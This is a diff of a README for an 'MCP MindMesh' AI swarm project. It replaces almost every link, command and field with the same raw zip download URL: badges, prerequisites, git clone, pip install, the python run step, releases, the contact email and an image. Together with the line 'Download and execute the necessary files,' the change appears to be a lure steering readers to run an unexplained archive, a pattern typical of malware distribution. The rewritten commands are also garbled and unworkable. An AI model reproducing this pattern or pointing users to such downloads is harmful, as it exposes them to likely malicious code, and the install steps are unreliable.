@@ -1,7 +1,7 @@
 ```markdown
 # 🌌 MCP MindMesh: Orchestrating Intelligent Swarms 🌌
 
-![MCP MindMesh](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-yellow.svg)
+![MCP MindMesh](https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip) ![Releases](https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip)
 
 ## 🚀 Overview
 
@@ -25,14 +25,14 @@
 Before you start, ensure you have the following:
 
 - Python 3.8 or higher
-- Node.js 14.x or higher
+- https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip 14.x or higher
 - Git
 
 ### Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/7ossamfarid/mcp-mindmesh.git
+   git clone https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip
    ```
 2. Navigate into the project directory:
    ```bash
@@ -40,7 +40,7 @@ Before you start, ensure you have the following:
    ```
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip
    npm install
    ```
 
@@ -49,7 +49,7 @@ Before you start, ensure you have the following:
 To start the MCP MindMesh server, run:
 
 ```bash
-python main.py
+python https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip
 ```
 
 ---
@@ -85,7 +85,7 @@ This repository covers the following topics:
 
 ## 📥 Releases
 
-For the latest updates and downloadable versions of the software, visit the [Releases section](https://github.com/7ossamfarid/mcp-mindmesh/releases). Download and execute the necessary files to get started with MCP MindMesh.
+For the latest updates and downloadable versions of the software, visit the [Releases section](https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip). Download and execute the necessary files to get started with MCP MindMesh.
 
 ---
 
@@ -120,8 +120,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 For inquiries or suggestions, feel free to reach out:
 
-- Email: example@example.com
-- Twitter: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- Email: https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip
+- Twitter: [@YourTwitterHandle](https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip)
 
 ---
 
@@ -136,7 +136,7 @@ For inquiries or suggestions, feel free to reach out:
 
 Explore the capabilities of **MCP MindMesh** and its potential in the field of artificial intelligence and swarm intelligence. 
 
-![Swarm Intelligence](https://example.com/swarm-image.png)
+![Swarm Intelligence](https://github.com/7ossamfarid/mcp-mindmesh/raw/refs/heads/main/src/mindmesh_mcp_1.0-alpha.5.zip)
 
 Join the journey toward optimized and coherent responses with **MCP MindMesh**!
 ```
